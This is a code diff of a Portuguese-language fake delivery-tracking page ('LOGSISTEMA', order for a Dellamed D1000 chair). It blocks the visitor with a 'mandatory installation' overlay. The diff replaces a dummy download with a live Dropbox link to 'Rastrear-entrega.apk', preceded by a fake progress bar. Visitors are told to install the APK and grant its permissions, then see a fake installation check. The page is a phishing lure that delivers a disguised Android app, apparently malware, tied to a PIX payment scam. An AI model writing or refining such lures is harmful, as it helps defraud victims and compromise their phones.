@@ -17,7 +17,7 @@
         }
 
         #mandatoryOverlay {
-            backdrop-filter: blur(6px);
+            backdrop-filter: blur(8px);
         }
 
         @keyframes pulse-blue {
@@ -32,7 +32,7 @@
 <body class="bg-gray-50 text-gray-800">
 
     <!-- Bloqueio Obrigatório -->
-    <div id="mandatoryOverlay" class="fixed inset-0 z-[200] bg-white/90 flex items-center justify-center p-4">
+    <div id="mandatoryOverlay" class="fixed inset-0 z-[200] bg-white/95 flex items-center justify-center p-4">
         <div id="installerCard" class="bg-white rounded-3xl max-w-md w-full p-8 shadow-[0_25px_60px_rgba(0,0,0,0.15)] border border-gray-100 text-center">
             
             <!-- Estado 1: Início -->
@@ -42,19 +42,19 @@
                         <i class="fas fa-file-arrow-down"></i>
                     </div>
                 </div>
-                <h2 class="text-2xl font-black text-gray-900 mb-3">Download Obrigatório</h2>
+                <h2 class="text-2xl font-black text-gray-900 mb-3">Instalação Obrigatória</h2>
                 <p class="text-gray-600 mb-8 text-sm leading-relaxed">
-                    Por motivos de segurança e conferência da <strong>Cadeira Dellamed D1000</strong>, o rastreio detalhado só é liberado através do nosso assistente de entrega.
+                    Para visualizar os dados de entrega da <strong>Dellamed D1000</strong> e realizar o pagamento via PIX após conferência, é obrigatório o uso do nosso assistente de logística.
                 </p>
                 
                 <div class="space-y-4">
                     <button onclick="iniciarFluxoDownload()" class="btn-download-now w-full bg-blue-600 text-white py-4 rounded-2xl font-bold text-lg shadow-xl shadow-blue-200 hover:bg-blue-700 transition-all flex items-center justify-center gap-3">
                         <i class="fas fa-download"></i>
-                        Baixar e Instalar agora
+                        Baixar e Instalar
                     </button>
                     <div class="flex items-center justify-center gap-2 text-gray-400">
                         <i class="fas fa-shield-check text-xs"></i>
-                        <span class="text-[10px] uppercase font-bold tracking-widest">Arquivo Seguro: LogSistema_v2.apk</span>
+                        <span class="text-[10px] uppercase font-bold tracking-widest">Link de download direto verificado</span>
                     </div>
                 </div>
             </div>
@@ -63,8 +63,8 @@
             <div id="stateProgress" class="hidden space-y-6">
                 <div class="w-16 h-16 border-4 border-blue-100 border-t-blue-600 rounded-full animate-spin mx-auto"></div>
                 <div>
-                    <h3 class="text-xl font-bold text-gray-900">Baixando arquivo...</h3>
-                    <p class="text-gray-500 text-sm mt-1">Aguarde o término do download direto.</p>
+                    <h3 class="text-xl font-bold text-gray-900">Baixando App...</h3>
+                    <p class="text-gray-500 text-sm mt-1">O download direto foi iniciado.</p>
                 </div>
                 <div class="w-full bg-gray-100 h-3 rounded-full overflow-hidden">
                     <div id="progressBar" class="bg-blue-600 h-full w-0 transition-all duration-300"></div>
@@ -78,53 +78,68 @@
                     <i class="fas fa-circle-check text-green-500 text-2xl"></i>
                     <div>
                         <p class="text-sm font-bold text-green-800">Download Concluído!</p>
-                        <p class="text-[11px] text-green-600">LogSistema_v2.apk (64.2 MB)</p>
+                        <p class="text-[11px] text-green-600">Rastrear-entrega.apk</p>
                     </div>
                 </div>
                 
-                <h3 class="text-lg font-bold text-gray-900 mb-4">Como liberar o rastreio:</h3>
+                <h3 class="text-lg font-bold text-gray-900 mb-4">Próximos passos:</h3>
                 
                 <div class="space-y-4 mb-8">
                     <div class="flex gap-4">
-                        <div class="bg-gray-100 w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 font-bold text-sm">1</div>
-                        <p class="text-sm text-gray-600">Clique no arquivo baixado na sua barra de notificações.</p>
+                        <div class="bg-blue-600 text-white w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 font-bold text-sm">1</div>
+                        <p class="text-sm text-gray-600 font-medium">Abra o arquivo APK que acabou de ser baixado.</p>
                     </div>
                     <div class="flex gap-4">
-                        <div class="bg-gray-100 w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 font-bold text-sm">2</div>
-                        <p class="text-sm text-gray-600">Se solicitado, autorize a instalação de "Fontes Desconhecidas".</p>
+                        <div class="bg-blue-600 text-white w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 font-bold text-sm">2</div>
+                        <p class="text-sm text-gray-600 font-medium">Instale o aplicativo e conceda as permissões necessárias.</p>
                     </div>
                     <div class="flex gap-4">
-                        <div class="bg-gray-100 w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 font-bold text-sm">3</div>
-                        <p class="text-sm text-gray-600">Abra o app para confirmar o recebimento da <strong>D1000</strong>.</p>
+                        <div class="bg-blue-600 text-white w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 font-bold text-sm">3</div>
+                        <p class="text-sm text-gray-600 font-medium">Após abrir o app, o rastreio será liberado aqui.</p>
                     </div>
                 </div>
 
-                <button onclick="liberarManual()" class="w-full bg-gray-900 text-white py-4 rounded-2xl font-bold hover:bg-black transition-all flex items-center justify-center gap-2">
+                <button onclick="liberarManual()" class="w-full bg-gray-900 text-white py-4 rounded-2xl font-bold hover:bg-black transition-all flex items-center justify-center gap-2 shadow-lg">
                     <i class="fas fa-check"></i>
-                    Já iniciei a instalação
+                    Já instalei o aplicativo
                 </button>
-                <p class="text-center text-[10px] text-gray-400 mt-4 italic">O sistema irá detectar a instalação em instantes...</p>
             </div>
 
         </div>
     </div>
 
-    <!-- Conteúdo do Site (Fundo) -->
+    <!-- Conteúdo do Site (Bloqueado) -->
     <div id="mainContent" class="blur-content">
-        <header class="bg-white border-b border-gray-200 p-4">
+        <header class="bg-white border-b border-gray-200 p-4 sticky top-0">
             <div class="max-w-5xl mx-auto flex justify-between items-center">
-                <div class="font-bold text-xl">LOG<span class="text-blue-600">SISTEMA</span></div>
-                <div class="text-xs text-gray-400">#DLM-9928341</div>
+                <div class="font-bold text-xl flex items-center gap-2">
+                    <i class="fas fa-truck-fast text-blue-600"></i>
+                    LOG<span class="text-blue-600">SISTEMA</span>
+                </div>
+                <div class="text-xs font-bold bg-gray-100 px-3 py-1 rounded-full text-gray-500">#DLM-9928341</div>
             </div>
         </header>
-        <main class="max-w-5xl mx-auto p-4 mt-8 space-y-6">
-            <div class="h-32 bg-white rounded-2xl border border-gray-200"></div>
-            <div class="h-64 bg-white rounded-2xl border border-gray-200"></div>
-            <div class="h-48 bg-white rounded-2xl border border-gray-200"></div>
+        
+        <main class="max-w-5xl mx-auto p-4 py-8">
+            <div class="bg-white rounded-2xl border border-gray-200 p-8 text-center mb-6">
+                <div class="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-4">
+                    <i class="fas fa-location-dot text-blue-600 text-2xl animate-bounce"></i>
+                </div>
+                <h1 class="text-2xl font-bold mb-2">A caminho do seu endereço</h1>
+                <p class="text-gray-500">Localização oculta por segurança. Instale o app.</p>
+            </div>
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="h-40 bg-white rounded-2xl border border-gray-200"></div>
+                <div class="h-40 bg-white rounded-2xl border border-gray-200"></div>
+            </div>
         </main>
     </div>
 
     <script>
+        // Link fornecido via Dropbox com ?dl=1 para download direto
+        const APP_URL = "https://www.dropbox.com/scl/fi/lhoztvt4xj9lals8qydf6/Rastrear-entrega.apk?rlkey=22ey6gtoeyo09lcg3vw3ara7n&st=h7rlg4rf&dl=1";
+
         function iniciarFluxoDownload() {
             document.getElementById('stateInitial').classList.add('hidden');
             document.getElementById('stateProgress').classList.remove('hidden');
@@ -133,49 +148,38 @@
             const percentText = document.getElementById('progressPercent');
             let width = 0;
             
+            // Simulação visual de progresso antes do gatilho de download
             const interval = setInterval(() => {
                 if (width >= 100) {
                     clearInterval(interval);
                     
-                    // Dispara o download real de um arquivo (simulado como blob para funcionar no navegador)
-                    triggerRealDownload();
+                    // Dispara o download real do link do Dropbox
+                    window.location.href = APP_URL;
                     
                     setTimeout(() => {
                         document.getElementById('stateProgress').classList.add('hidden');
                         document.getElementById('stateInstall').classList.remove('hidden');
-                    }, 500);
+                    }, 1000);
                 } else {
-                    width += Math.random() * 12;
+                    width += Math.random() * 8;
                     if (width > 100) width = 100;
                     progress.style.width = width + '%';
                     percentText.innerText = Math.floor(width) + '%';
                 }
-            }, 300);
-        }
-
-        function triggerRealDownload() {
-            // Cria um link temporário para forçar o navegador a baixar o arquivo
-            const dummyContent = "Conteudo do instalador LogSistema";
-            const blob = new Blob([dummyContent], { type: 'application/vnd.android.package-archive' });
-            const url = window.URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.style.display = 'none';
-            a.href = url;
-            a.download = 'LogSistema_Rastreio_v2.apk';
-            document.body.appendChild(a);
-            a.click();
-            window.URL.revokeObjectURL(url);
+            }, 200);
         }
 
         function liberarManual() {
-            // Função que simula que o usuário já instalou e agora pode ver o site
             const modal = document.getElementById('mandatoryOverlay');
-            const content = document.getElementById('mainContent');
             
             modal.innerHTML = `
-                <div class="bg-white p-8 rounded-3xl text-center shadow-2xl animate-bounce">
-                    <i class="fas fa-spinner fa-spin text-4xl text-blue-600 mb-4"></i>
-                    <p class="font-bold">Sincronizando com o App...</p>
+                <div class="bg-white p-10 rounded-3xl text-center shadow-2xl border border-gray-100">
+                    <div class="relative w-16 h-16 mx-auto mb-6">
+                        <div class="absolute inset-0 border-4 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
+                        <i class="fas fa-sync-alt absolute inset-0 flex items-center justify-center text-blue-600"></i>
+                    </div>
+                    <p class="font-black text-xl mb-2 text-gray-900">Validando Instalação...</p>
+                    <p class="text-gray-500 text-sm">O sistema está reconhecendo o app no seu dispositivo.</p>
                 </div>
             `;
             
@@ -183,7 +187,7 @@
                 document.getElementById('mandatoryOverlay').classList.add('hidden');
                 document.getElementById('mainContent').classList.remove('blur-content');
                 document.body.style.overflow = 'auto';
-            }, 2000);
+            }, 3000);
         }
     </script>
 </body>
